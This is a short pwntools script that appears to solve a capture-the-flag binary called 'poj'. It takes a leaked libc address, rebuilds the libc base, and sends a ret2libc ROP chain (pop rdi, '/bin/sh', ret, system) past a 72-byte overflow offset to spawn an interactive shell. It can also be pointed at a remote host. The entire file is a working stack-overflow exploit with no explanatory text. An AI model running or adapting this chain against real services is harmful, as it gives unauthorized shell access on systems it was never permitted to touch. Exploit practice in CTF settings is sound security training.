#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *
from warnings import filterwarnings

# Set up pwntools for the correct architecture
exe = context.binary = ELF('poj')
libc = ELF("./libc.so.6")
context.terminal = ['xfce4-terminal', '--title=GDB-Pwn', '--zoom=0', '--geometry=128x50+1100+0', '-e']

filterwarnings("ignore")
context.log_level = 'debug'

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE: 
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
init-pwndbg
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

def init():
    global io

    io = start()


def solve():

    io.recvuntil("address :")
    libc.address = int(io.recvline().strip(), 16) - libc.sym["write"]
    pop_rdi = libc.address + 0x0000000000028215 # pop rdi ; ret
    ret = libc.address + 0x000000000002668c # ret
    sh = next(libc.search(b'/bin/sh\x00'))
    system = libc.sym["system"]

    offset = 64 + 8

    payload = flat({
        offset: [
            pop_rdi,
            sh,
            ret,
            system
        ]
    })

    io.sendline(payload)

    io.interactive()


def main():
    
    init()
    solve()


if __name__ == '__main__':
    main()

